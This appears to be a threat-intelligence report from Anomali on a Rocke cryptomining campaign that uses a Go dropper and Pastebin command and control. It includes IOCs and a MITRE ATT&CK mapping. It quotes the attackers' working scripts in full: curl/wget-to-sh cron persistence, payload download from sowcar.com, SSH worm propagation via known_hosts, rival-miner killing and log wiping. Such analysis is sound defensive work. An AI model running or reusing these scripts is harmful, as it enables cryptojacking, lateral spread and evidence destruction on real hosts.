Rocke is actively updating and pushing a\nnew dropper using Pastebin for Command and Control (C2). Recent updates to the C2 as\nof March 13th, 2019 have been seen, which leads researchers to believe this campaign is\nongoing. According to VirusTotal, the threat detection of the new dropper is nearly nonexistent. The group has been observed in previous campaigns to use “ld.so.preload”\nfunction to hook libc functions. The hooking is used to hide the dropper and the mining\nsoftware installed by the malware and prevents it from showing up in the “currently running”\nprocess list. This tactic is being utilized by the group in this new campaign. The miner uses\na private mining pool hosted on DigitalOcean which is a change in the threat actor’s\nprevious tactics.\n\n## Introduction\n\nThe threat actor group, Rocke, was first reported by Cisco Talos in August 2018.[1] On\nJanuary 17th, 2019, Palo Alto Networks’ Unit 42 reported on a campaign conducted by the\ngroup that was active in October 2018, in which the group utilized a malware written in\nPython to orchestrate the infection and spreading of their coinminer.[2] On March 12th,\n2019, Anomali Research has, with high confidence, identified a new active campaign that\nwe believe is being conducted by Rocke. The objective of the campaign, similar to other\nRocke activity, is to drop a miner onto a machine to mine Monero cryptocurrency. This\nongoing campaign has extensive Tactics Techniques and Procedures (TTPs) that overlap\nwith the report published by Unit 42.\n\n\n-----\n\nThis campaign is different from prior activity because a new dropper was observed being\nused by Rocke that is written in Go (Golang) instead of Python. The detection for the\nmalware on VirusTotal (VT) is nearly non-existent. Figure 1, below, shows the detections for\nthe most recent sample submitted to VT. It can be seen that only one engine successfully\ndetected it as malicious. The low detection rate of the malware coupled with the techniques\nthat prevent the Rocke malicious processes from showing up in the running processes of\nvictim machines, raises the possibility that this campaign has been successfully running for\nweeks.\n\n_Figure 1: Scanning results from VirusTotal for one of the malware samples._\n\n## Technical Details\n\n### Analysis of the Dropper\n\nThe samples analyzed are packed with UPX. The UPX header has been modified to break\nthe unpacker provided by the UPX project. Instead of having the “UPX!” string, it has been\nreplaced with “LSD!”. Repairing the header is needed to unpack the samples using the\nunpacker provided by the UPX team.\n\nThe dropper is written in Go (Golang) and the estimated source code structure, based on\nthe decompiler, is shown below:\n\n\n-----\n\n```\nPackage main: /root/go/src/github.com/hippies/LSD\nFile: main.go  \n  goatt Lines: 12 to 17 (5)  \n  main Lines: 17 to 34 (17)  \n/root/go/src/github.com/hippies/LSD/LSDB\nFile: a.go  \n  _kBytes Lines: 13 to 27 (14)  \n  KWR Lines: 27 to 36 (9)  \nFile: b.go  \n  _libBytes Lines: 10 to 17 (7)  \n  LibWrite Lines: 17 to 25 (8)  \nFile: c.go  \n  _netdnsinitBytes Lines: 11 to 18 (7)  \n  _netdnsserviceBytes Lines: 18 to 26 (8)  \n  NetdnsWrite Lines: 26 to 37 (11)  \n/root/go/src/github.com/hippies/LSD/LSDA  \nFile: a.go  \n  getiplista Lines: 12 to 37 (25)  \n  run Lines: 37 to 86 (49)  \n  runtwo Lines: 86 to 98 (12)  \n  Ago Lines: 98 to 108 (10)  \n  (Ago)func1 Lines: 103 to 106 (3)  \nFile: b.go  \n  getiplistb Lines: 18 to 42 (24)  \n  generateTask Lines: 42 to 54 (12)  \n  cmd Lines: 54 to 81 (27)  \n  (cmd)func1 Lines: 62 to 98 (36)  \n  cmdtwo Lines: 81 to 93 (12)  \n  bgo Lines: 93 to 113 (20)  \n  (bgo)func1 Lines: 98 to 101 (3)  \n  Bbgo Lines: 113 to 118 (5)  \n/root/go/src/github.com/hippies/LSD/LSDC  \nFile: a.go  \n  Read Lines: 17 to 43 (26)  \n  PathExists Lines: 43 to 54 (11)  \n  CopyFile Lines: 54 to 65 (11)  \n  Mkdir Lines: 65 to 69 (4)  \n  Writefile Lines: 69 to 79 (10)  \n  Writefiletwo Lines: 79 to 88 (9)  \n  Delfile Lines: 88 to 97 (9)  \n  Changetime Lines: 97 to 105 (8)  \n  Cmdexec Lines: 105 to 111 (6)  \n  Checkupdate Lines: 111 to 129 (18)  \n  Getip Lines: 129 to 149 (20)  \n  Getipb Lines: 149 to 164 (15)  \n  Cron Lines: 164 to 173 (9)\n\n```\nThe main execution process can be summarized in the following steps:\n\n1. Delete “/etc/ld.so.preload” if it exists\n2. Get the PID of the process and writes it to “/tmp/.lsdpid”\n3. Uses “chattr -i” to mark the PID file protected so it cannot be modified\n4 Copies itself from “/tmp/kthrotlds” to “/usr/sbin/kthrotlds”\n\n\n-----\n\n5. Turns the modified time stamp on the moved file back 416 days\n6. Installs an “init.d” startup script to “/etc/init.d/netdns” and a systemd service script to\n\n“/usr/lib/systemd/system/netdns.service”; the modified time is also changed for these\nfiles in the same way\n7. Enabling the service on the compromised system by executing: “chkconfig --add\n\nnetdns” and “systemctl enable netdns”\n8. Removes the files “/tmp/kthrotlds” and “/tmp/kintegrityds”\n9. Writes code to “/usr/local/lib/libcset.c”\n10. Compiles it with “gcc /usr/local/lib/libcset.c -Wall -shared -fPIC -ldl -o\n\n/usr/local/lib/libcset.so”\n11. If GCC is not installed it tries to install it and recompile “yum -y install gcc -y||apt-get -y\n\ninstall gcc”\n12. Adds the path to the shared object to “/etc/ld.so.preload” and protects the file from\n\nmodifications\n13. Persistence is added through Cron by executing echo \"*/10 * * * * (curl -fsSL\n\nhttps://pastebin.com/raw/yPRSa0ki||wget -q -Ohttps://pastebin.com/raw/yPRSa0ki)|sh\" | crontab - and by adding “*/15 * * * * (curl fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -Ohttps://pastebin.com/raw/yPRSa0ki)|sh” to “/var/spool/cron/crontabs/root”\n14. Checking for updates by checking the version listed at\n\n“https://pastebin.com/raw/HWBVXK6H”\n15. Installs the Monero miner at “/tmp/kintegrityds” and protects it\n16. The miner connects to a private pool hosted on DigitalOcean with IP and port of:\n\n134.209.104.20:51640\n\nThe malware also starts an “attack” thread that scans for SSH and Redis servers. The\nmalware uses “ident.me” to determine the machines external host so it does not attack\nitself.\n\n### Command and Control\n\nThe malware uses Pastebin for Command and Control (C2). The URL\n“https://pastebin[.]com/HWBVXK6H” is used to check for the latest version of the malware.\nIf a new version is available, the malware reaches out to “https://pastebin[.]com/yPRSa0ki”.\nThe paste shown below serves as a redirect to the actual setup stript.\n```\n(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -Ohttps://pastebin.com/raw/D8E71JBJ)|sed 's/\n//'|sh\n\n```\nThe setup script in paste D8E71JBJ, shown below, kills other mining malware and\ndownloads and executes the threat actors’ malware instead. It will also try to use known\nSSH hosts and the SSH key on the machine to spread latterly.\n\n\n-----\n\n```\nexport PATH $PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin\necho \"*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -Ohttps://pastebin.com/raw/yPRSa0ki)|sh\" | crontab mkdir -p /tmp\nchmod 1777 /tmp\nps -ef|grep -v grep|grep hwlh3wlh44lh|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep Circle_MI|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep get.bi-chi.com|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep hashvault.pro|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep nanopool.org|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"xmr\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"xig\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"ddgs\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"qW3xT\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"wnTKYg\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"t00ls.ru\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"sustes\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"thisxxs\"|awk '{print $2}' | xargs kill -9\nps -ef|grep -v grep|grep \"hashfish\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"kworkerds\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"watchdog\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"/tmp/devtool\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"systemctI\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"watchdogs\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"ksoftirqds\"|awk '{print $2}'|xargs kill -9\nps -ef|grep -v grep|grep \"suolbcc\"|awk '{print $2}'|xargs kill -9\nps aux|grep -v grep|grep -v kintegrityds|awk '{if($3>=80.0) print $2}'|xargs kill -9\nyum -y install coreutils||apt-get -y install coreutils\napt-get install cron -y||yum install crontabs -y||apk add cron -y\nif [ ! -f \"/tmp/.lsdpid\" ]; then\n  ARCH=$(uname -m)\n  if [ ${ARCH}x = \"x86_64x\" ]; then\n    (curl -fsSL http://sowcar.com/t6/678/1552060180x1822611359.jpg -o\n/tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060180x1822611359.jpg -O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  elif [ ${ARCH}x = \"i686x\" ]; then\n    (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o\n/tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  else\n    (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o\n/tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  fi\n    nohup /tmp/kthrotlds >/dev/null 2>&1 &\nelif [ ! -f \"/proc/$(cat /tmp/.lsdpid)/stat\" ]; then\n  ARCH=$(uname -m)\n  if [ ${ARCH}x = \"x86_64x\" ]; then\n    (curl -fsSL http://sowcar.com/t6/678/1552060180x1822611359.jpg -o\n\n```\n\n-----\n\n```\n/tmp/kthrotlds||wget q http://sowcar.com/t6/678/1552060180x1822611359.jpg O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  elif [ ${ARCH}x = \"i686x\" ]; then\n    (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o\n/tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  else\n    (curl -fsSL http://sowcar.com/t6/678/1552060225x1822611359.jpg -o\n/tmp/kthrotlds||wget -q http://sowcar.com/t6/678/1552060225x1822611359.jpg -O\n/tmp/kthrotlds) && chmod +x /tmp/kthrotlds\n  fi\n    nohup /tmp/kthrotlds >/dev/null 2>&1 &\nfi\nif [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then\n for h in $(grep -oE \"([0-9]{1,3}.){3}[0-9]{1,3}\" /root/.ssh/known_hosts); do ssh oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL\nhttps://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh\n>/dev/null 2>&1 &' & done\nfi\necho 0>/var/spool/mail/root\necho 0>/var/log/wtmp\necho 0>/var/log/secure\necho 0>/var/log/cron\n#\n\n```\nThe Pastebin profile used by the actor for this campaign is shown below. It can be seen that\nthese pastes were added on February 24th, 2019.\n\n_Figure 2: Pastebin profile used by the threat actor_\n\nThe server hosting the malware has the appearance of a free Chinese image hosting site,\nshown in Figure 3 below. The page asks a visitor to upload their identity photo for the\nChinese online shopping website, Taobao.\n\n\n-----\n\n_Figure 3: Image hosting site from where the malware is downloaded from._\n\nAccording to the Whois record, shown below, the fake image hosting domain was created\non June 21st, 2018. It is also registered by the same email (4592248@gmail[.]com) as\nanother domain that was used in an earlier Rocke campaign which indicates that it is likely\nthe site is controlled by the threat group.[3]\n\n\n-----\n\n```\n Domain Name: SOWCAR.COM\n Registry Domain ID: 2277522871_DOMAIN_COM-VRSN\n Registrar WHOIS Server: whois.ename.com\n Registrar URL: http://www.ename.net\n Updated Date: 2019-03-08T01:38:36Z\n Creation Date: 2018-06-21T11:14:39Z\n Registry Expiry Date: 2019-06-21T11:14:39Z\n Registrar: eName Technology Co., Ltd.\n Registrar IANA ID: 1331\n Registrar Abuse Contact Email: abuse@ename.com\n Registrar Abuse Contact Phone: 86.4000044400\n Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n Domain Status: clientTransferProhibited\nhttps://icann.org/epp#clientTransferProhibited\n Name Server: DALE.NS.CLOUDFLARE.COM\n Name Server: JOAN.NS.CLOUDFLARE.COM\n DNSSEC: unsigned\n URL of the ICANN Whois Inaccuracy Complaint Form:\n Registry Registrant ID:Not Available From Registry\n Registrant Name: LuWei\n Registrant Organization: Lu Wei\n Registrant Street: SiChuan ZhongLu 668 Hao 8 Lou\n Registrant City: ShangHai\n Registrant State/Province: ShangHai\n Registrant Postal Code: 200000\n Registrant Country: CN\n Registrant Phone: +86.2139003725\n Registrant Phone Ext:\n Registrant Fax: +86.2139003725\n\n```\n\n-----\n\n```\n Registrant Fax Ext:\n Registrant Email: 4592248@gmail.com\n Registry Admin ID:Not Available From Registry\n\n## Overlapping TTPs with previous campaigns\n\n```\nThe current campaign has numerous TTPs overlapping with the previous campaign\nreported by Unit 42. In both campaigns, the group uses Pastebin for C2 and the C2 system\ndepends on 3 public pastes. One paste serves the latest version, one acts as a redirect to\nthe third that is used to initialize the infection. The redirect uses either “cURL” or “wget” to\nfetch the initialization script from the paste. The paste is “piped” to either “bash” or “sh” after\nsome cleanup. In addition to the similarities in the structures, the user account names also\nappear to follow a similar pattern. In this campaign the username is “SYSTEMTEN” while\nlast campaign username was “SYSTEAM”. The first five characters of the username\n(SYSTE) may be an indication of other Rocke activity.\n\nThe filenames of the payloads are also similar in the two latest reported campaigns. Below\nare the URLs used to download the payload in this campaign and the campaign reported by\nUnit 42. The filenames have the same structure, with some of the numbers overlapping.\n```\nhttp://sowcar.com/t6/678/1552060180x1822611359.jpg\nhttps://master.minerxmr.ru/2/1551434778x2728329032.jpg\n\n```\nThe malware uses cron for persistence. The similar crontab entries are shown below. The\nonly difference between the entries are the ID of paste used.\n\nCron jobs created by the Python version of the malware:\n```\n\"*/10 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -Ohttps://pastebin.com/raw/1NtRkBc3)|sh\n##\"\n\"*/15 * * * * (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -Ohttps://pastebin.com/raw/1NtRkBc3)|sh\n##\"\n\n```\nCron jobs created by the Go version of the malware:\n\n\n-----\n\n```\n /10   root (curl fsSL https://pastebin.com/raw/yPRSa0ki||wget q O \nhttps://pastebin.com/raw/yPRSa0ki)|sh\n##\n*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -Ohttps://pastebin.com/raw/yPRSa0ki)|sh\n##\n\n```\nIn this campaign, the threat actor also uses “init” and “systemd” services for persistence.\nThe name of the service is “netdns.” Below is a snippet from the setup script used by Rocke\nin a previous campaign that also uses the serviced called netdns. After the file is created,\nthe access and modified time is changed before the file is marked as non-modifiable. The\nsame technique is used by the new malware written in Go.\n```\ncurl -fsSL --connect-timeout 120 https://master.minerxmr.ru/Pep/4 -o\n/etc/init.d/netdns||wget https://master.minerxmr.ru/Pep/4 -O /etc/init.d/netdns) &&\nchmod 777 /etc/init.d/netdns && touch -acmr /bin/sh /etc/init.d/netdns && chattr +i\n/etc/init.d/netdns\n\n```\nThe spreading technique observed by Anomali researchers is the same one used in\nprevious campaigns. The malware in both previous and ongoing campaign assumes that it\nhas root level access on the machine. Below are code snippets from the current campaign\nand the campaign reported by Unit 42, where the threat actor uses ssh keys and known\nhosts if they are available to infect other machines.\n\n**Last campaign**\n```\nif [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then  \n        for h in $(grep -oE \"([0-9]{1,3}.){3}[0-9]{1,3}\"\n/root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q\n-O- https://pastebin.com/raw/1NtRkBc3)|sh' & done\nfi\n\n```\n**Current campaign**\n```\nif [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then\n for h in $(grep -oE \"([0-9]{1,3}.){3}[0-9]{1,3}\" /root/.ssh/known_hosts); do ssh oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL\nhttps://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh\n>/dev/null 2>&1 &' & done\nfi\n\n```\nIn addition to the propagation over SSH, the new malware tries to compromise Redis\nservers just like the Python-based malware.\n\n\n-----\n\nThere is also overlap of infrastructure. The email used to register the sowcar[.]com domain\nalso registered thyrsi[.]com. This domain was reported on and linked to the same threat\ngroup in a report by Cisco Talos in December 2018. The domains registered by this email\naddress is shown in the figure below.\n\n_Figure 4: Domains registered by the same email address._\n\n## Conclusion\n\nAnomali Labs has detected a new campaign by the threat group Rocke. In this campaign,\nthe group has changed from using a Python-based malware to a malware written in Golang.\nThe detection of this new malware is nearly non-existent. In addition, the group uses a\nprivate mining pool to reduce the risks of being detected.\n\n## Mitre ATT&CK\n\nT1190 Exploit Public-Facing Application\nT1078 Valid Accounts\nT1168 Local Job Scheduling\nT1110 Brute Force\nT1222 File Permissions Modification\nT1021 Remote Services\nT1064 Scripting\nT1045 Software Packing\nT1071 Standard Application Layer Protocol\nT1099 Timestomp\nT1055 Process Injection\n\n\n-----\n\nT1036 Masquerading\n\n## IOCs\n\n**URLS**\n```\nhttps://pastebin[.]com/raw/yPRSa0ki\nhttps://pastebin[.]com/raw/wDBa7jCQ\nhttps://pastebin[.]com/raw/D8E71JBJ\nhttps://pastebin[.]com/raw/HWBVXK6H\nhttps://pastebin[.]com/raw/qs3ger9z\nhttp://sowcar[.]com/t6/678/1552060180x1822611359.jpg\nhttp://sowcar[.]com/t6/678/1552060225x1822611359.jpg\nhttp://sowcar[.]com/t6/682/1552580197x2890211702.jpg\n\n```\n**SHA256**\n```\n029e79bc2e232d21b61c09463dd89e515606b7b9df771572627394cbe59e1cbd\n93efdee9def596b93517699958e7a5c3f0bae88e220cb08593c4712f143696dd\n3a4391293d1a7fbd5cfc34258aa0cfcd57abb8b4453e47ea293c572fbf1862ad\n60aadabd2f3f1465f239d2721a663f4b9f9d15e739dcb14df64e241c2d37e30c\n9df3ae6da6b262f5dea6a1f5438127cd4cfa8d718997b4e90b107fabb2b392be\ne2db2dca7d84098192c5562c299a76330ca556ac30d583ac8079fe63b61e94d5\n\n```\n**Mining pool**\n\n134.209.104.20:51640\n\n## Endnotes\n\n[David Liedenberg, “Rocke: The Champion of Monero Miners,” Talos Blog, accessed](https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html)\nMarch 14, 2019, published August 30, 2018.\nXingyu Jin and Claud Xiao, “Malware Used by “Rocke” Group Evolves to Evade\nDetection by Cloud Security Products,” Palo Alto Networks, accessed March 14,\n2019, published January 17, 2019.\nDavid Liebenberg and Andrew Williams, “Connecting the dots between recently active\ncryptominers,” Talos Blog, accessed March 14, 2019, published December 18, 2018.\n\n\n-----\n\nTopics: Research\n\n\n-----",
